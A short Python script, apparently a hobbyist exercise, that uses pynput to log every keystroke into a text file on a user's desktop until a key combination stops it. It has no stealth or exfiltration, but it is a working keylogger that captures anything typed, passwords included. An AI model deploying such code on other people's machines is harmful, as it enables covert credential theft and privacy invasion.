from pynput import keyboard
import time

# creating a new file named keys
keys = open(r"C:\Users\Ritick Madaan\Desktop\keys.txt", "w")
keys.close()


close_combination = {keyboard.Key.ctrl_r,
                     keyboard.Key.shift_l, keyboard.Key.alt_l}
current = set()

keys = open(r"C:\Users\Ritick Madaan\Desktop\keys.txt", "a")

i_time = time.time()  # initial time on the starting of the programme


def on_press(key):
    global keys  # to prevent unbound local error
    global i_time
    # if(time.time() - i_time <= 2):
    print(time.time() - i_time)
    if key in close_combination:
        current.add(key)
        if all(k in current for k in close_combination):

            keys.close()
            listener.stop()

    else:
        if(time.time() - i_time <= 2):
            pass
        else:
            keys.write("\n")

        if key == keyboard.Key.space:
            keys.write(" ")

        elif key == keyboard.Key.enter:
            keys.write("\n")

        elif key == keyboard.Key.backspace:
            keys.close()
            keys = open(r"C:\Users\Ritick Madaan\Desktop\keys.txt", "r")
            data = keys.read()
            keys.close()
            keys = open(r"C:\Users\Ritick Madaan\Desktop\keys.txt", "a")
            keys.truncate(len(data)-1)
        else:
            try:
                keys.write(key.char)
            except AttributeError:
                # keys.write(format(key))
                pass  # keys like shift, enter, ctrl come in this category

    i_time = time.time()


def on_release(key):
    try:
        current.remove(key)
    except KeyError:
        pass
    try:
        # it helps write the keys which are clicked at the same time
        keys.write(key)
    except:
        pass


# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()


# ... or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()

# does it work fine next line
